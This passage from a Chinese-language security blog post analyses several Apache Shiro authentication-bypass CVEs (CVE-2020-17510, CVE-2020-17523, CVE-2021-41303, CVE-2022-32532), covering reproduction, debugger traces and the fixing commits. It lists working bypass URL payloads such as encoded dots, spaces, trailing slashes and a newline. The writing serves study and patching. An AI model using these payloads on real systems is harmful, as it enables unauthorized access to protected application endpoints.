<h4 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>发送payload，调式进入<code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</code>方法中，根据表达式运算工具，返回的是 <code>&quot;/admin/&quot;</code>，和预期的一样</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290036230.png" alt="image-20220929003634143"></p>
<p>下面简单分析下绕过的过程，在上面有提到过<code>WebUtils#getServletPath</code>会对url进行一次解码，因此我们请求的<code>/myshiro/admin/%3baa</code>变成了<code>/admin/;aa</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290038213.png" alt="image-20220929003830087"></p>
<p>然后调用<code>removeSemicolon</code>方法处理，熟悉的都知道这个是去除 <code>&quot;;&quot;</code>及后面的字符串</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290040208.png" alt="image-20220929004034127"></p>
<p>然后再调用<code>normalize</code>函数进行路径标准化处理，最后得到的就是<code>/admin/</code>，返回requestURI后，去除末尾的 <code>&quot;/&quot;</code>，与<code>pathPattern: &quot;/admin/*&quot;</code> 匹配失败导致权限绕过。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290042047.png" alt="image-20220929004233861"></p>
<p>而spring、tomcat会将请求处理成<code>/admin/;aa</code>，然后配合 <code>PathVariable</code> 注解 String 类型的参数，导致可以绕过鉴权请求 <code>/admin/&#123;name&#125;</code></p>
<h4 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于 <a href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit-dc194fc</a> 中，新增了一个全局过滤器</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290049896.png" alt="image-20220929004959661"></p>
<p>在类的注释中详细的说明了该过滤器的作用和规则，将会阻断带有分号，反斜线，非 ASCII 字符的请求，返回400状态码</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290051726.png" alt="image-20220929005122565"></p>
<p>并添加进全局过滤器中</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290058906.png" alt="image-20220929005854832"></p>
<h3 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h3><h4 id="漏洞信息-8"><a href="#漏洞信息-8" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17510">CVE-2020-17510</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-60318">CNVD-2020-60318</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.7.0</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">Spring | 编码 | %2e | 绕过 | &#x2F;%2e%2e&#x2F;</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit-6acaaee</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk">https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>本次环境采用的是shiro1.6.0以及 <code>PathVariable</code> 注解 String 类型参数的场景，还是基于 AntPathMatcher 的绕过，前面的绕过有个共性就是shiro对uri处理的逻辑与Spring不同导致的，还记得CVE-2010-3836采用的是 <code>&quot;.&quot;</code> 进行绕过的，还有采用 <code>&quot;;&quot;</code>和URL编码%3b的，那 “.”的url编码%2e可否呢，本次漏洞的payload就是出自%2e。</p>
<p>用CVE-2020-13933的payload，失败</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290111362.png" alt="image-20220929011116229"></p>
<p>访问 <code>/myshiro/admin/%2e</code>即可绕过</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290109716.png" alt="image-20220929010952572"></p>
<p>当然还有<code>/myshiro/admin/%2e/</code>，<code>/myshiro/admin/%2e%2e</code>，<code>/myshiro/admin/%2e%2e/</code> </p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290112656.png" alt="image-20220929011211496"></p>
<h4 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>访问<code>/myshiro/admin/%2e</code>，调试进入<code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</code>，运算表达式，可见返回<code>&quot;/admin/&quot;</code>，到这就不用继续下去了，和CVE-2020-13933的分析一样，先调用<code>getServletPath</code>方法对 <code>/admin/%2e</code>进行url解码得到<code>/admin/.</code>，然后经过<code>normalize</code>函数路径标准化将<code>/admin/.</code>转化为<code>/admin/</code>，到这也就为什么<code>/myshiro/admin/%2e/</code>，<code>/myshiro/admin/%2e%2e</code>，<code>/myshiro/admin/%2e%2e/</code> 这几个payload能用的原因了，经过这两个方法处理都“无了”。</p>
<blockquote>
<p>经测试，<code>getServletPath</code>方法会进行url解码，”;”及后面字符串的去除，和路径标准化处理</p>
</blockquote>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290116378.png" alt="image-20220929011646282"></p>
<p>对于Spring来说，Spring Boot 版本在小于等于 2.3.0.RELEASE时，会对uri进行解码然后路径标准化，这样得到的路径为<code>/myshiro/admin</code>，没有路径与之匹配。所以只有当 Spring Boot 版本在大于 2.3.0.RELEASE时标准化路径后<code>/myshiro/admin/%2e</code>，然后解码得到<code>/myshiro/admin/.</code>，所以其他payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/myshiro/admin/%2e/  -&gt; /myshiro/admin/%2e/ -&gt; /myshiro/admin/./ </span><br><span class="line">/myshiro/admin/%2e%2e  -&gt; /myshiro/admin/%2e%2e -&gt; /myshiro/admin/..</span><br><span class="line">/myshiro/admin/%2e%2e/  -&gt; /myshiro/admin/%2e%2e/ -&gt; /myshiro/admin/../</span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于 <a href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit-6acaaee</a>，创建了 UrlPathHelper 的子类 ShiroUrlPathHelper，并重写了 <code>getPathWithinApplication</code> 和 <code>getPathWithinServletMapping</code> 两个方法，使得spring在处理uri时使用 Shiro 自己的逻辑 <code>WebUtils#getPathWithinApplication</code> 进行返回，这样就能保证Spring 与 Shiro 处理requestURI时不会在差异</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290234831.png" alt="image-20220929023441599"></p>
<p>创建好ShiroUrlPathHelper类后，就将其导入到ApplicationConfig配置类中</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290239331.png" alt="image-20220929023951127"></p>
<p>将<code>RequestMappingHandlerMapping#urlPathHelper</code> 设置为 <code>ShiroUrlPathHelper</code>，而后，Spring 在匹配 handler 时获取路径的逻辑就会使用 Shiro 提供的逻辑。在高版本的spring中，会导致应用程序使用 <code>UrlPathHelper.defaultInstance</code> 来处理，而不是 Shiro 实现的 <code>ShiroUrlPathHelper</code> 来处理，又会导致权限绕过的产生。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290244102.png" alt="image-20220929024451029"></p>
<h3 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h3><h4 id="漏洞信息-9"><a href="#漏洞信息-9" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17523">CVE-2020-17523</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-09492">CNVD-2021-09492</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.7.1</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">Spring | trim | %20 | 绕过 | &#x2F;%20%20&#x2F;</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Commit-ab1ea4a</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://www.anquanke.com/post/id/230935">https://www.anquanke.com/post/id/230935</a> <a href="https://www.eso.org/~ndelmott/url_encode.html">https://www.eso.org/~ndelmott/url_encode.html</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>本次环境用的是shiro1.7.0和依赖单个 “*” 的通配符以及 <code>PathVariable</code> 注解 String 类型的参数的场景触发漏洞，本次的绕过方法是使用空格的 URL 编码：<code>%20</code>。</p>
<p>访问 <code>/myshiro/admin/%20</code>成功绕过，当然也可以 <code>/myshiro/admin/%20%20</code> <code>/myshiro/admin/%20%20/</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290321040.png" alt="image-20220929032153886"></p>
<h4 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>处理完之后的requestURI为 <code>&quot;/admin/ &quot;</code>和pathPattern <code>&quot;/admin/*&quot;</code>进行匹配，这里肯定是匹配失败返回false的，但是为什么呢</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290305963.png" alt="image-20220929030502864"></p>
<p>跟进来到<code>org.apache.shiro.util.AntPathMatcher#doMatch</code>方法，这里会调用<code>org.apache.shiro.util.StringUtils#tokenizeToStringArray</code>方法对pattern和path进行处理，我们跟进去</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290307188.png" alt="image-20220929030711053"></p>
<p>在<code>org.apache.shiro.util.StringUtils#tokenizeToStringArray</code>方法中主要是将str按照delimiters进行分割，然后保存到tokens中，其中传入的两个布尔类型的参数trimTokens控制是否对token去除空格，ignoreEmptyTokens控制是否忽略空的tokens</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290311637.png" alt="image-20220929031134396"></p>
<p>在去出第二个token时，这里的token为 <code>&quot; &quot;</code>，因为经过<code>trim()</code>处理后为<code>&quot;&quot;</code>，所以最终返回的tokens数组就只有admin一个，导致匹配失败</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290314800.png" alt="image-20220929031416572"></p>
<p>而对于spring来说，空格也是可以作为RequestMapping请求的路径的，所以能够请求成功</p>
<h4 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于<a href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Commit-ab1ea4a</a>，将<code>org.apache.shiro.util.StringUtils#tokenizeToStringArray</code> 方法的第三个参数 trimTokens 设置为 false，忽略空格的去除</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290318338.png" alt="image-20220929031859220"></p>
<h3 id="CVE-2021-41303"><a href="#CVE-2021-41303" class="headerlink" title="CVE-2021-41303"></a>CVE-2021-41303</h3><h4 id="漏洞信息-10"><a href="#漏洞信息-10" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41303">CVE-2021-41303</a> &#x2F; <a href="https://issues.apache.org/jira/browse/SHIRO-825">SHIRO-825</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.8.0</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">Apache Shiro 与 Spring Boot 一起使用时，远程攻击者可以发送特制的 HTTP 请求， 绕过身份验证过程并获得对应用程序的未授权访问。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">Spring | 回退 | &#x2F;aaa&#x2F;*&#x2F; | 绕过</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left">[<a href="https://threedr3am.github.io/]">https://threedr3am.github.io/]</a>(<a href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro">https://threedr3am.github.io/2021/09/22/从源码diff分析Apache-Shiro</a> 1.7.1版本的auth bypass（CVE-2021-41303）&#x2F;)</td>
</tr>
</tbody></table>
<h4 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>本次环境用的是shiro1.7.1，配置匹配规则如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterMap.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">filterMap.put(<span class="string">&quot;/admin/test&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>直接访问 <code>/myshiro/admin/test</code>失败，因为会和第一条规则匹配</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291011138.png" alt="image-20220929101119957"></p>
<p>访问 <code>/myshiro/admin/test/</code>，成功绕过</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291013394.png" alt="image-20220929101333216"></p>
<h4 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>方法中相较于shiro1.7.0版本有了些不同</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291405696.png" alt="image-20220929140503407"></p>
<p>在1.7.1中把外部可控的requestURINoTrailingSlash（requestURI去掉了&#x2F;后缀）带入到了<code>org.apache.shiro.web.filter.mgt.FilterChainManager#proxy</code>方法中，因此可以发送特定的请求去达到权限绕过。</p>
<p>场景一：当发送如下的请求时，因为requestURI和pathPattern直接就匹配上了，进入到了<code>filterChainManager.proxy(originalChain, pathPattern)</code>，就无法利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URI：/myshiro/admin/test</span><br><span class="line">pathPattern：/admin/*</span><br></pre></td></tr></table></figure>

<p>场景二：当发送如下的请求时，我们在URI后多加一个&#x2F;，就能让requestURI和pathPattern匹配不上，进入第二次匹配，并且能在第二次匹配中使其pathPattern和requestURINoTrailingSlash成功匹配上，从而进入<code>filterChainManager.proxy(originalChain, requestURINoTrailingSlash)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URI：/myshiro/admin/test/</span><br><span class="line">pathPattern：/admin/*</span><br></pre></td></tr></table></figure>

<p>但是如果<code>requestURINoTrailingSlash</code>在鉴权配置的map中找不到（字符串比较）对应的value数据时，就会报错，而在shiro1.7.1之前，传入的是外部无法控制的<code>pathPattern</code>，而<code>pathPattern</code>是来自于鉴权配置map中的key，所以肯定是可以找到</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291422061.png" alt="image-20220929142213955"></p>
<p>如果我们在环境中配置如下规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterMap.put(&quot;/admin/*&quot;, &quot;authc&quot;);</span><br><span class="line">filterMap.put(&quot;/admin/test&quot;, &quot;anon&quot;);</span><br></pre></td></tr></table></figure>

<p>在shiro1.7.1之前，我们访问 <code>/myshiro/admin/test/</code>，此时调用<code>filterChainManager.proxy(originalChain, &quot;/admin/*&quot;)</code>那肯定是 <code>/admin/*</code>这个authc  filter进行了处理进行了拦截，在shiro1.7.1开始，调用的就是<code>filterChainManager.proxy(originalChain, &quot;/admin/test&quot;)</code>那肯定是 <code>/admin/test</code>这个anon filter进行了处理，进而顺利的bypass auth访问到了接口。</p>
<p>更多细节可以参考：<a href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro%201.7.1%E7%89%88%E6%9C%AC%E7%9A%84auth%20bypass%EF%BC%88CVE-2021-41303%EF%BC%89/">从源码diff分析Apache-Shiro 1.7.1版本的auth bypass（CVE-2021-41303））</a></p>
<h4 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于 <a href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a>，解决方式就是和1.7.1之前一样传入<code>pathPattern</code>获取filter</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291434553.png" alt="image-20220929143422342"></p>
<h3 id="CVE-2022-32532"><a href="#CVE-2022-32532" class="headerlink" title="CVE-2022-32532"></a>CVE-2022-32532</h3><h4 id="漏洞信息-11"><a href="#漏洞信息-11" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32532">CVE-2022-32532</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.9.1</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">RegexRequestMatcher 在使用带有 “.” 的正则时，可能会导致权限绕过</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">RegexRequestMatcher | . | 绕过</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://github.com/4ra1n/CVE-2022-32532">CVE-2022-32532</a> <a href="https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh">https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh</a> <a href="https://tanzu.vmware.com/security/cve-2022-22978">https://tanzu.vmware.com/security/cve-2022-22978</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>该漏洞和CVE-2022-22978 Spring-security RegexRequestMatcher 认证绕过漏洞类似，在 RegexRequestMatcher 中使用的正则匹配在默认情况下, 正则表达式中点(.)不会匹配换行符, 设置了<code>Pattern.DOTALL</code>模式, 才会匹配所有字符包括换行符，因此可以使用在路径中添加换行符来绕过权限校验。</p>
<p>漏洞环境采用的是4ra1n师傅的，但已经删除了，可以访问<a href="https://github.com/Lay0us1/CVE-2022-32532%EF%BC%8C%E5%9C%A8%E8%BF%99%E5%A5%97%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%94%A8%E7%9A%84%E6%98%AFshiro1.9.0%EF%BC%8C%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8%E7%9A%84PatternMatcher%E4%B8%BA%60RegExPatternMatcher%60">https://github.com/Lay0us1/CVE-2022-32532，在这套环境中用的是shiro1.9.0，环境使用的PatternMatcher为`RegExPatternMatcher`</a></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291454788.png" alt="image-20220929145453712"></p>
<p>环境搭建好后，<code>/permit/*</code>下的都是需要权限的，因此直接访问失败</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291458346.png" alt="image-20220929145816133"></p>
<p>使用绕过的payload <code>/myshiro/permit/%0axx</code>，成功访问</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291459803.png" alt="image-20220929145930657"></p>
<h4 id="漏洞分析-11"><a href="#漏洞分析-11" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>使用payload访问，调式进入<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>，在进行pathPattern匹配时会调用<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#pathMatches</code>，该方法会获取PatternMatcher</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291506290.png" alt="image-20220929150615200"></p>
<p>此时获取到的不再是默认的<code>AntPathMatcher</code>，而是<code>RegExPatternMatcher</code>，在该类中并没有配置<code>Pattern.DOTALL</code>，导致匹配失败</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291514317.png" alt="image-20220929151424114"></p>
<h4 id="漏洞修复-11"><a href="#漏洞修复-11" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于 <a href="https://github.com/apache/shiro/commit/6bcb92e06fa588b9c7790dd01bc02135d58d3f5b">Commit-6bcb92e</a>，在进行正则匹配时添加了 <code>Pattern.DOTALL</code> 选项</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291516236.png" alt="image-20220929151605959"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>花三天全部漏洞跟了一遍，算是解决了之前的一些疑惑，后面打算再把fastjson全版本漏洞过一遍，加深对漏洞的理解。</p>
<p>环境的代码上传到github了，有需要的自取：<a href="https://github.com/kpa1on/study_code/blob/master/shiro%E7%8E%AF%E5%A2%83.zip%EF%BC%8C%E5%BE%88%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%85%AC%E7%94%A8%E4%B8%80%E4%B8%AA%E7%8E%AF%E5%A2%83%EF%BC%8C%E5%8F%AA%E9%9C%80%E7%AE%80%E5%8D%95%E6%94%B9%E4%B8%8Bshiro%E7%9A%84%E7%89%88%E6%9C%AC%E5%8D%B3%E5%8F%AF%E3%80%82%E6%88%91%E8%87%AA%E5%B7%B1%E6%95%B4%E7%90%86%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%9A%84%E5%AD%97%E5%85%B8%E6%94%BE%E5%9C%A8%E4%BA%86GitHub%E4%B8%8A%EF%BC%9Ahttps://github.com/kpa1on/bypass_auth_dic/blob/master/auth_bypass.txt%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%BE%88%E7%81%B5%E6%B4%BB%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8contextpath%E5%A4%84%EF%BC%8Cservlet%E5%90%8E%EF%BC%8C%E6%88%96%E8%80%85path%E4%B8%AD%E9%97%B4%E7%AD%89%E7%AD%89%E3%80%82">https://github.com/kpa1on/study_code/blob/master/shiro%E7%8E%AF%E5%A2%83.zip，很多漏洞可公用一个环境，只需简单改下shiro的版本即可。我自己整理的权限绕过的字典放在了GitHub上：https://github.com/kpa1on/bypass_auth_dic/blob/master/auth_bypass.txt，使用很灵活，可以在contextpath处，servlet后，或者path中间等等。</a></p>
<p>文中大量参考了su18师傅的分析过程，su18师傅的文章写的很详细，浅显易懂。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://su18.org/post/shiro-5/">https://su18.org/post/shiro-5/</a></p>
<p><a href="https://blog.csdn.net/Xxy605/article/details/125404334">https://blog.csdn.net/Xxy605/article/details/125404334</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect</a><br><a href="https://cloud.tencent.com/developer/article/1848169">https://cloud.tencent.com/developer/article/1848169</a><br><a href="https://blog.csdn.net/whq12789/article/details/88031965">https://blog.csdn.net/whq12789/article/details/88031965</a><br><a href="https://mp.weixin.qq.com/s/m6eHtxGTMK4igNQcMpqxaw">https://mp.weixin.qq.com/s/m6eHtxGTMK4igNQcMpqxaw</a><br><a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a><br><a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a><br><a href="https://xz.aliyun.com/t/9406">https://xz.aliyun.com/t/9406</a><br><a href="https://xz.aliyun.com/t/7544">https://xz.aliyun.com/t/7544</a><br><a href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro%201.7.1%E7%89%88%E6%9C%AC%E7%9A%84auth%20bypass%EF%BC%88CVE-2021-41303%EF%BC%89/">https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro%201.7.1%E7%89%88%E6%9C%AC%E7%9A%84auth%20bypass%EF%BC%88CVE-2021-41303%EF%BC%89/</a><br><a href="https://github.com/Lay0us1/CVE-2022-32532">https://github.com/Lay0us1/CVE-2022-32532</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>shiro</tag>
      </tags>
  </entry>
</search>
